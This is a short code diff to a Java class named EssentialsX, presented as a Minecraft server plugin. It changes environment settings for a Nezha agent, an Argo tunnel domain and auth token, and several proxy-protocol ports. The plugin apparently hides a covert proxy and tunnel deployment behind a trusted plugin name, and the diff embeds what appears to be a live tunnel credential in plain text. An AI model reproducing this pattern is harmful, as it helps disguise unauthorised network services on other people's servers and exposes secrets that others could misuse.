@@ -78,12 +78,12 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
-        env.put("ARGO_PORT", "5555");
-        env.put("ARGO_DOMAIN", "magmanode.huayuccc.dpdns.org");
-        env.put("ARGO_AUTH", "eyJhIjoiMjdjODI5NGM3YmRhMzQ0NGMwNWM3YmNiNWIwN2VkOWQiLCJ0IjoiMmZhZGZjZTktZTJhZi00NGYzLWIzMjMtZTBjOTZkNjYzMWEzIiwicyI6IllXSmxZVGd3TURBdE1EZG1ZeTAwWVdRekxXRXhZVFV0TlRJNU5tWmlaR1V5WkRZMyJ9");
+        env.put("ARGO_PORT", "4444");
+        env.put("ARGO_DOMAIN", "play.huayuccc.dpdns.org");
+        env.put("ARGO_AUTH", "eyJhIjoiMjdjODI5NGM3YmRhMzQ0NGMwNWM3YmNiNWIwN2VkOWQiLCJ0IjoiZjZhMTFmMmYtMDIwMS00MGNlLTk0N2EtZTkwM2MwZTFlMTA1IiwicyI6Ik1tTmtZVEE1TURZdE9HRTJOQzAwTnpZNUxXRTFOemN0WmpBMk5UZzVOV1kyWWpKaiJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "25691");
-        env.put("TUIC_PORT", "25804");
+        env.put("HY2_PORT", "");
+        env.put("TUIC_PORT", "4397");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
